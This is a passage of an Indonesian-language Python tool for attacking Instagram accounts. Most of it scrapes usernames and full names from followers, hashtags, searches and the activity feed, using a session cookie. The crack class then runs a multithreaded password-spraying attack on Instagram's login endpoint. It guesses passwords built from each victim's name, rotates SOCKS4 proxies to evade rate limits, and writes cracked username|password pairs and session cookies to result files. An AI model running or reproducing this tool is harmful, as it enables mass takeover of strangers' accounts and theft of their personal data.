            print(f"{H}[{P}?{H}]{P} Name :{K} {___pin[\'full_name\']}\
")
            ___file = (___pin[\'full_name\'].replace(\' \',\'_\')+\'.txt\')
        with requests.Session() as ses:
            ___pin = ses.get(f\'https://i.instagram.com/api/v1/friendships/{___pin["id"]}/followers/?count=5000\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()
            for z in ___pin[\'users\']:
                open(\'Dump/\'+___file, \'a\').write(z[\'username\']+\'<=>\'+z[\'full_name\']+\'\
\')
                print(f"{P}{z[\'username\']}<=>{z[\'full_name\']}")
            print(f"\
{B}[{P}*{B}]{U} s\xe1\xb4\x87\xca\x9f\xe1\xb4\x87s\xe1\xb4\x80\xc9\xaa...")
            print(f"{B}[{P}?{B}]{U} \xd2\x93\xc9\xaa\xca\x9f\xe1\xb4\x87 \xe1\xb4\x9b\xe1\xb4\x87\xca\x80s\xc9\xaa\xe1\xb4\x8d\xe1\xb4\xa9\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x85\xc9\xaa :{K} Dump/{___file}")
            input(f"{M}[{U}\xe1\xb4\x8b\xe1\xb4\x87\xe1\xb4\x8d\xca\x99\xe1\xb4\x80\xca\x9f\xc9\xaa{M}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} \xe1\xb4\x85\xe1\xb4\x9c\xe1\xb4\x8d\xe1\xb4\xa9 \xc9\xb4\xca\x8f\xe1\xb4\x80 \xc9\xa2\xe1\xb4\x80\xc9\xa2\xe1\xb4\x80\xca\x9f")
    except (ConnectionError):
        exit(f"{P}[{K}!{P}]{K} \xe1\xb4\x8b\xe1\xb4\x8f\xc9\xb4\xe1\xb4\x87\xe1\xb4\x8bs\xc9\xaa \xe1\xb4\x8d\xe1\xb4\x9c \xe1\xb4\x87\xca\x80\xe1\xb4\x8f\xca\x80")
# Dump Activity
def ___activity___():
    try:
        ___file = input(f"\
{H}[{P}?{H}]{B} \xc9\xb4\xe1\xb4\x80\xe1\xb4\x8d\xe1\xb4\x80 \xd2\x93\xc9\xaa\xca\x9f\xe1\xb4\x87 :{K} ").replace(\' \',\'_\')
        if ___file in [\'\',\' \']:
            exit(f"{P}[{M}!{P}]{M} \xe1\xb4\x8a\xe1\xb4\x80\xc9\xb4\xc9\xa2\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x8b\xe1\xb4\x8fs\xe1\xb4\x8f\xc9\xb4\xc9\xa2")
        else:
            print(f"{P} ")
            ___pin = requests.get(\'https://www.instagram.com/accounts/activity/?__a=1\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()})
            ___pin = re.findall(\'"username":"(.*?)","full_name":"(.*?)",\', ___pin.text)
            for z in ___pin:
                open(\'Dump/\'+___file, \'a\').write(z[0]+\'<=>\'+z[1]+\'\
\')
                print(f"{z[0]}<=>{z[1]}")
            print(f"\
{B}[{P}*{B}]{U} s\xe1\xb4\x87\xca\x9f\xe1\xb4\x87s\xe1\xb4\x80\xc9\xaa...")
            print(f"{B}[{P}?{B}]{U} \xd2\x93\xc9\xaa\xca\x9f\xe1\xb4\x87 \xe1\xb4\x9b\xe1\xb4\x87\xca\x80s\xc9\xaa\xe1\xb4\x8d\xe1\xb4\xa9\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x85\xc9\xaa :{K} Dump/{___file}")
            input(f"{M}[{U}\xe1\xb4\x8b\xe1\xb4\x87\xe1\xb4\x8d\xca\x99\xe1\xb4\x80\xca\x9f\xc9\xaa{M}]{P}");___menu___()
    except Exception as e:
        exit(f"{P}[{M}!{P}]{M} {e}")
# Dump Beranda
def ___beranda___():
    try:
        ___file = input(f"\
{H}[{P}?{H}]{B} \xc9\xb4\xe1\xb4\x80\xe1\xb4\x8d\xe1\xb4\x80 \xd2\x93\xc9\xaa\xca\x9f\xe1\xb4\x87 :{K} ").replace(\' \',\'_\')
        if ___file in [\'\',\' \']:
            exit(f"{P}[{M}!{P}]{M} \xe1\xb4\x8a\xe1\xb4\x80\xc9\xb4\xc9\xa2\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x8b\xe1\xb4\x8fs\xe1\xb4\x8f\xc9\xb4\xc9\xa2")
        else:
            print(f"{P} ")
            ___pin = requests.get(\'https://i.instagram.com/api/v1/feed/reels_tray/\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()
            for z in ___pin[\'tray\']:
                open(\'Dump/\'+___file, \'a\').write(z[\'user\'][\'username\']+\'<=>\'+z[\'user\'][\'full_name\']+\'\
\')
                print(f"{z[\'user\'][\'username\']}<=>{z[\'user\'][\'full_name\']}")
            print(f"\
{B}[{P}*{B}]{U} s\xe1\xb4\x87\xca\x9f\xe1\xb4\x87s\xe1\xb4\x80\xc9\xaa...")
            print(f"{B}[{P}?{B}]{U} \xd2\x93\xc9\xaa\xca\x9f\xe1\xb4\x87 \xe1\xb4\x9b\xe1\xb4\x87\xca\x80s\xc9\xaa\xe1\xb4\x8d\xe1\xb4\xa9\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x85\xc9\xaa :{K} Dump/{___file}")
            input(f"{M}[{U}\xe1\xb4\x8b\xe1\xb4\x87\xe1\xb4\x8d\xca\x99\xe1\xb4\x80\xca\x9f\xc9\xaa{M}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} \xe1\xb4\x85\xe1\xb4\x9c\xe1\xb4\x8d\xe1\xb4\xa9 \xc9\xb4\xca\x8f\xe1\xb4\x80 \xc9\xa2\xe1\xb4\x80\xc9\xa2\xe1\xb4\x80\xca\x9f")
    except (ConnectionError):
        exit(f"{P}[{M}!{P}]{M} \xe1\xb4\x8b\xe1\xb4\x8f\xc9\xb4\xe1\xb4\x87\xe1\xb4\x8bs\xc9\xaa \xe1\xb4\x8d\xe1\xb4\x9c \xe1\xb4\x87\xca\x80\xe1\xb4\x8f\xca\x80")
# Dump Hastag
def ___hastag___():
    try:
        ___tag = input(f"\
{H}[{P}?{H}]{P} Hastag :{K} ").replace(\'#\',\'\')
        if ___tag in [\'\',\' \']:
            exit(f"{P}[{M}!{P}]{M} \xe1\xb4\x8a\xe1\xb4\x80\xc9\xb4\xc9\xa2\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x8b\xe1\xb4\x8fs\xe1\xb4\x8f\xc9\xb4\xc9\xa2")
        ___file = input(f"{H}[{P}?{H}]{P} \xc9\xb4\xe1\xb4\x80\xe1\xb4\x8d\xe1\xb4\x80 \xd2\x93\xc9\xaa\xca\x9f\xe1\xb4\x87 :{K} ").replace(\' \',\'_\')
        if ___file in [\'\',\' \']:
            exit(f"{P}[{M}!{P}]{M} \xe1\xb4\x8a\xe1\xb4\x80\xc9\xb4\xc9\xa2\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x8b\xe1\xb4\x8fs\xe1\xb4\x8f\xc9\xb4\xc9\xa2")
        else:
            print(f"{P} ")
            ___pin = requests.get(f\'https://www.instagram.com/explore/tags/{___tag}/?__a=1\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()})
            ___pin = re.findall(\'"username":"(.*?)","full_name":"(.*?)",\', ___pin.text)
            for z in ___pin:
                open(\'Dump/\'+___file, \'a\').write(z[0]+\'<=>\'+z[1]+\'\
\')
                print(f"{z[0]}<=>{z[1]}")
            print(f"\
{B}[{P}*{B}]{P} s\xe1\xb4\x87\xca\x9f\xe1\xb4\x87s\xe1\xb4\x80\xc9\xaa...")
            print(f"{B}[{P}?{B}]{P} \xd2\x93\xc9\xaa\xca\x9f\xe1\xb4\x87 \xe1\xb4\x9b\xe1\xb4\x87\xca\x80s\xc9\xaa\xe1\xb4\x8d\xe1\xb4\xa9\xe1\xb4\x80\xc9\xb4 \xe1\xb4\x85\xc9\xaa :{K} Dump/{___file}")
            input(f"{M}[{P}\xe1\xb4\x8b\xe1\xb4\x87\xe1\xb4\x8d\xca\x99\xe1\xb4\x80\xca\x9f\xc9\xaa{M}]{P}");___menu___()
    except Exception as e:
        exit(f"{P}[{M}!{P}]{M} {e}")
# Dump Search
def ___search___():
    try:
        ___user = input(f"\
{H}[{P}?{H}]{P} User :{K} ")
        if ___user[:1] in [\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'0\']:
            exit(f"{P}[{M}!{P}]{M} Gunakan Username")
        else:
            ___pin = requests.get(f\'https://www.instagram.com/{___user}/?__a=1\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()[\'graphql\'][\'user\']
            print(f"{H}[{P}?{H}]{P} Name :{K} {___pin[\'full_name\']}\
")
            ___file = (___pin[\'full_name\'].replace(\' \',\'_\')+\'.txt\')
        with requests.Session() as ses:
            ___pin = ses.get(f\'https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id={___pin["id"]}&include_friendship_status=true\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()
            for z in ___pin[\'users\']:
                open(\'Dump/\'+___file, \'a\').write(z[\'username\']+\'<=>\'+z[\'full_name\']+\'\
\')
                print(f"{P}{z[\'username\']}<=>{z[\'full_name\']}")
            print(f"\
{H}[{P}*{H}]{P} Selesai...")
            print(f"{H}[{P}?{H}]{P} File Tersimpan Di :{K} Dump/{___file}")
            input(f"{M}[{P}Kembali{M}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} Dump Gagal")
    except (ConnectionError):
        exit(f"{P}[{K}!{P}]{K} Koneksi Error")
# Dump Query
def ___query___():
    try:
        ___query = input(f"\
{H}[{P}?{H}]{P} Query :{K} ")
        if ___query in [\'\',\' \']:
            exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
        else:
            print(f"{P} ")
            ___file = ___query.replace(\' \',\'_\')+\'.txt\'
            ___pin = requests.get(f\'https://www.instagram.com/web/search/topsearch/?context=blended&query={___query}&rank_token=0.3953592318270893&count=5000\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()
            for z in ___pin[\'users\']:
                open(\'Dump/\'+___file, \'a\').write(z[\'user\'][\'username\']+\'<=>\'+z[\'user\'][\'full_name\']+\'\
\')
                print(f"{z[\'user\'][\'username\']}<=>{z[\'user\'][\'full_name\']}")
            print(f"\
{B}[{P}*{B}]{P} Selesai...")
            print(f"{B}[{P}?{B}]{P} File Tersimpan Di :{K} Dump/{___file}")
            input(f"{M}[{P}Kembali{M}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} Dump Gagal")
    except (ConnectionError):
        exit(f"{P}[{K}!{P}]{K} Koneksi Error")
# Dump Dari Email
def ___email___():
    try:
        ___nama = input(f"\
{H}[{P}?{H}]{P} Nama :{K} ").replace(\' \',\'\')
        if ___nama in [\'\',\' \']:
            exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
        ___domain = input(f"{H}[{P}?{H}]{P} Domain :{K} ")
        if ___domain in [\'@gmail.com\',\'@yahoo.com\',\'@hotmail.com\',\'@email.com\',\'@mail.com\',\'@outlook.com\',\'@yandex.com\']:
            ___limit = int(input(f"{H}[{P}?{H}]{P} Limit :{K} "))
            if ___limit >=1001:
                exit(f"{P}[{M}!{P}]{M} Maksimal 1000")
            else:
                print(f"{P} ")
                ___file = \'Dump/\'+___nama+\'.txt\'
                for _ in range(___limit):
                    ___nomor = random.randint(1, 999)
                    ___user = ___nama + str(___nomor) + ___domain + \'<=>\' + ___nama + \' \' + str(___nomor)
                    open(___file, \'a\').write(f\'{___user}\
\')
                    print(f"{___user}")
                print(f"\
{B}[{P}*{B}]{P} Selesai...")
                print(f"{B}[{P}?{B}]{P} File Tersimpan Di :{K} {___file}")
                input(f"{M}[{P}Kembali{M}]{P}");___menu___()
        else:
            exit(f"{P}[{M}!{P}]{M} Domain \'@gmail.com\',\'@yahoo.com\',\'@hotmail.com\',\'@email.com\',\'@mail.com\',\'@outlook.com\',\'@yandex.com\'")
    except Exception as e:
        exit(f"{P}[{M}!{P}]{M} {e}")
# Proxy
def ___proxy___():
    try:
        ___pin = requests.get(\'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all\').text
        open(\'Data/proxy.txt\', \'w\').write(___pin)
    except Exception as e:
        ___pin = requests.get(\'https://raw.githubusercontent.com/akuhantu/alfin1/main/Data/proxy2.txt\').text
        open(\'Data/proxy.txt\', \'w\').write(___pin)
    ___crack___()
# Crack
class ___crack___:
    
    def __init__(self):
        self.kill = 0
        self.ok = []
        self.cp = []
        print(f"\
{H}[{P}1{H}]{B} \xc9\xa2\xe1\xb4\x9c\xc9\xb4\xe1\xb4\x80\xe1\xb4\x8b\xe1\xb4\x80\xc9\xb4 \xe1\xb4\xa9\xe1\xb4\x80ss\xe1\xb4\xa1\xe1\xb4\x8f\xca\x80\xe1\xb4\x85 {H}[{K}\xc9\xb4\xe1\xb4\x80\xe1\xb4\x8d\xe1\xb4\x80, \xe1\xb4\x80\xca\x9f\xd2\x93\xc9\xaa\xc9\xb4, \xe1\xb4\x80\xca\x9f\xd2\x93\xc9\xaa\xc9\xb4{H}]{K}")      
        print(f"{H}[{P}2{H}]{B} \xc9\xa2\xe1\xb4\x9c\xc9\xb4\xe1\xb4\x80\xe1\xb4\x8b\xe1\xb4\x80\xc9\xb4 \xe1\xb4\xa9\xe1\xb4\x80ss\xe1\xb4\xa1\xe1\xb4\x8f\xca\x80\xe1\xb4\x85 \xe1\xb4\x8d\xe1\xb4\x80\xc9\xb4\xe1\xb4\x9c\xe1\xb4\x80\xca\x9f {H}[{K}>5{H}]{K}\
")
        ___pilih = input(f"{B}[{P}?{B}]{B} \xe1\xb4\xa9\xc9\xaa\xca\x9f\xc9\xaa\xca\x9c :{H} ")
        if ___pilih in [\'4\',\'04\']:
            pwx = input(f"{B}[{P}?{B}]{B} Password :{H} ").split(\',\')
        try:
            self.___dump = input(f"{B}[{P}?{B}]{B} \xd2\x93\xc9\xaa\xca\x9f\xe1\xb4\x87 \xe1\xb4\x85\xe1\xb4\x9c\xe1\xb4\x8d\xe1\xb4\xa9 :{H} ")
            self.___file = open(self.___dump, \'r\').read().splitlines()
        except (IOError):
            exit(f"{P}[{M}!{P}]{M} \xd2\x93\xc9\xaa\xca\x9f\xe1\xb4\x87 \xc9\xb4\xca\x8f\xe1\xb4\x80 \xc9\xa2\xe1\xb4\x80\xe1\xb4\x8b \xe1\xb4\x85\xe1\xb4\x80\xe1\xb4\x8b")
        try:
            print(f"\
{H}[{P}\xe2\x80\xa2{H}]{U} \xca\x9c\xe1\xb4\x80s\xc9\xaa\xca\x9f \xe1\xb4\x8f\xe1\xb4\x8b\xe1\xb4\x87 \xe1\xb4\x85\xc9\xaas\xc9\xaa\xe1\xb4\x8d\xe1\xb4\xa9\xe1\xb4\x87\xc9\xb4 \xe1\xb4\x8b\xe1\xb4\x87  Results/Ok.txt")
            print(f"{H}[{P}\xe2\x80\xa2{H}]{U} \xca\x9c\xe1\xb4\x80s\xc9\xaa\xca\x9f \xe1\xb4\x84\xe1\xb4\xa9 \xe1\xb4\x85\xc9\xaas\xc9\xaa\xe1\xb4\x8d\xe1\xb4\xa9\xe1\xb4\x87\xc9\xb4 \xe1\xb4\x8b\xe1\xb4\x87  Results/Cp.txt\
")
            with ThreadPoolExecutor(max_workers=30) as (___hayuk):
                for ___user in self.___file:
                    username, nama = ___user.split(\'<=>\')
                    z = nama.split(\' \')
                    if ___pilih in [\'1\',\'01\']:
                        password = [nama.replace(\' \',\'\'), nama, z[0]+\'123\', z[0]+\'12345\']
                    elif ___pilih in [\'2\',\'02\']:
                        password = [nama.replace(\' \',\'\'), nama, z[0]+\'123\', z[0]+\'1234\', z[0]+\'12345\']
                    elif ___pilih in [\'3\',\'03\']:
                        password = [nama.replace(\' \',\'\'), nama, z[0]+\'123\', z[0]+\'1234\', z[0]+\'12345\', z[0]+\'123456\']
                    elif ___pilih in [\'4\',\'04\']:
                        password = pwx
                    else:
                        password = [nama.replace(\' \',\'\'), nama, z[0]+\'123\', z[0]+\'1234\', z[0]+\'12345\']
                    ___hayuk.submit(self.__main__, self.___file, username, password)
            exit(f"\
{M}[{P}Selesai{M}]{P}")
        except (ValueError):
            exit(f"{P}[{M}!{P}]{M} Crack Selesai Sepertinya Ada Yang Error Silahkan Dump Ulang!")
    def __main__(self, user, uid, pwx):
        try:
            ___useragent = open(\'Data/ua.txt\', \'r\').read()
        except (IOError):
            ___useragent = (\'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36\')
        try:
            for pw in pwx:
                pw = pw.lower()
                ___url = (\'https://www.instagram.com/\')
                ___login = (\'https://www.instagram.com/accounts/login/ajax/\')
                ___proxy = {\'http\': \'socks4://%s\'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                ___csrf = requests.get(___url).cookies[\'csrftoken\']
                ___data = {\'username\': uid,
                \'enc_password\': f\'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}\',
                \'queryParams\': {},
                \'optIntoOneTap\': \'false\'}
                ___head = {\'User-Agent\': random.choice(open("Data/ua.txt","r").read().splitlines()),
                \'X-Requested-With\': \'XMLHttpRequest\',
                \'Referer\': \'https://www.instagram.com/accounts/login/\',
                \'x-csrftoken\': ___csrf}
                with requests.Session() as ses:
                    response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
                    if \'userId\' in str(response):
                        coki = (f\'mid={ses.cookies.get_dict()["mid"]};ig_did={ses.cookies.get_dict()["ig_did"]};ig_nrcb=1;shbid="9776\\0541986587953\\0541674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809\\0541986587953\\0541674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken={ses.cookies.get_dict()["csrftoken"]};ds_user_id={ses.cookies.get_dict()["ds_user_id"]};sessionid={ses.cookies.get_dict()["sessionid"]};rur="EAG\\0541986587953\\0541674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"\')
                        try:
                            ___pin = requests.get(f\'https://www.instagram.com/{uid}/?__a=1\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()[\'graphql\'][\'user\']
                            follower = ___pin[\'edge_followed_by\'][\'count\']
                            following = ___pin[\'edge_follow\'][\'count\']
                        except (KeyError, IOError):
                            follower = (\'-\')
                            following = (\'-\')
                        except:pass
                        print(f"\\r{B}[{P}\xf0\x9f\x98\x8b{B}]{P} Status :{H} Success     ")
                        print(f"{B}[{P}>{B}]{P} Username :{H} {uid}")
                        print(f"{B}[{P}>{B}]{P} Password :{H} {pw}")
                        print(f"{B}[{P}>{B}]{P} Follower :{H} {follower}")
                        print(f"{B}[{P}>{B}]{P} Following :{H} {following}")
                        print(f"{B}[{P}>{B}]{P} Cookie :{H} {coki}\
")
                        self.ok.append(f"{uid}|{pw}")
                        open(\'Results/Ok.txt\',\'a\').write(f"{uid}|{pw}\
")
                        break
                    elif \'checkpoint_required\' in str(response):
                        try:
                            ___pin = requests.get(f\'https://www.instagram.com/{uid}/?__a=1\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()[\'graphql\'][\'user\']
                            follower = ___pin[\'edge_followed_by\'][\'count\']
                            following = ___pin[\'edge_follow\'][\'count\']
                        except (KeyError, IOError):
                            follower = (\'-\')
                            following = (\'-\')
                        except:pass
                        print(f"\\r{B}[{P}\xf0\x9f\xa5\xba{B}]{P} Status :{K} Checkpoint    ")
                        print(f"{B}[{P}>{B}]{P} Username :{K} {uid}")
                        print(f"{B}[{P}>{B}]{P} Password :{K} {pw}")
                        print(f"{B}[{P}>{B}]{P} Follower :{K} {follower}")
                        print(f"{B}[{P}>{B}]{P} Following :{K} {following}\
")
                        self.cp.append(f"{uid}|{pw}")
                        open(\'Results/Cp.txt\',\'a\').write(f"{uid}|{pw}\
")
                        break
                    elif \'Please wait\' in str(response):
                        print(f"{P}[{M}!{P}]{M} Gunakan Mode Pesawat 2 Detik", end=\'\\r\');sleep(7);__main__(self, user, uid, pwx)
                    else:
                        continue
            self.kill +=1
            print(f"{P}[{P}Crack{P}]{P} {self.kill}/{str(len(user))} Cp:-{len(self.cp)} Ok:-{len(self.ok)}          ", end=\'\\r\')
        except (ConnectionError):
            print(f"{P}[{K}!{P}]{K} Koneksi Error               ", end=\'\\r\');sleep(7);__main__(self, user, uid, pwx)
        except:__main__(self, user, uid, pwx)

if __name__==\'__main__\':
    os.system(\'git pull\')
    ___menu___()
